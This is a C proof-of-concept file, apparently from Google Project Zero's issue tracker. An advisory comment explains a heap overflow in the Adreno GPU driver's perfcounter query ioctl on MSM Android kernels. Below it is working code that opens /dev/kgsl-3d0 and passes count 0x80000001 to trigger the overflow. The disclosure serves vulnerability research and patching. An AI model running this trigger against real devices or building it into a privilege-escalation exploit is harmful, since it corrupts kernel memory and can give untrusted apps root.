/*
Source: https://code.google.com/p/google-security-research/issues/detail?id=734

The Adreno GPU driver for the MSM Linux kernel contains a heap
overflow in the IOCTL_KGSL_PERFCOUNTER_QUERY ioctl command. The bug
results from an incorrect conversion to a signed type when calculating
the minimum count value for the query option. This results in a
negative integer being used to calculate the size of a buffer, which
can result in an integer overflow and a small sized allocation on
32-bit systems:

int adreno_perfcounter_query_group(struct adreno_device *adreno_dev,
        unsigned int groupid, unsigned int __user *countables,
        unsigned int count, unsigned int *max_counters)
{
...
        if (countables == NULL || count == 0) {
                kgsl_mutex_unlock(&device->mutex, &device->mutex_owner);
                return 0;
        }

        t = min_t(int, group->reg_count, count);

        buf = kmalloc(t * sizeof(unsigned int), GFP_KERNEL);
        if (buf == NULL) {
                kgsl_mutex_unlock(&device->mutex, &device->mutex_owner);
                return -ENOMEM;
        }

        for (i = 0; i < t; i++)
                buf[i] = group->regs[i].countable;

Note that the "count" parameter is fully controlled. Setting count =
0x80000001 will result in min_t returning 0x80000001 for "t", and
kmalloc allocating a buffer of size 0x4. The loop will then overflow
"buf" because "t" is unsigned, i.e. a large positive value.

The bug was added in the following commit:

https://www.codeaurora.org/cgit/quic/la/kernel/msm/commit/drivers/gpu/msm/adreno.c?h=aosp-new/android-msm-angler-3.10-marshmallow-mr1&id=b3b5629aebe98d3eb5ec22e8321c3cd3fc70f59c

A proof-of-concept that triggers this issue (adreno_perfcnt_query.c)
is attached. On Android devices /dev/kgsl-3d0 is typically accessible
in an untrusted app domain, so if exploited this issue could be used
for local privilege escalation.

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>

struct kgsl_perfcounter_query {
	unsigned int groupid;
	unsigned int *countables;
	unsigned int count;
	unsigned int max_counters;
	unsigned int __pad[2];
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_PERFCOUNTER_QUERY _IOWR(KGSL_IOC_TYPE, 0x3A, struct kgsl_perfcounter_query)

int main(void) {
	int fd;
	struct kgsl_perfcounter_query data;
	unsigned int countables[16];

	fd = open("/dev/kgsl-3d0", O_RDWR);

	if (fd == -1) {
		perror("open");
		return -1;
	}

	memset(&data, 0, sizeof(struct kgsl_perfcounter_query));

	data.groupid = 1;
	data.countables = (unsigned int *) &countables;
	data.count = 0x80000001;

	ioctl(fd, IOCTL_KGSL_PERFCOUNTER_QUERY, &data);

	close(fd);

	return 0;
}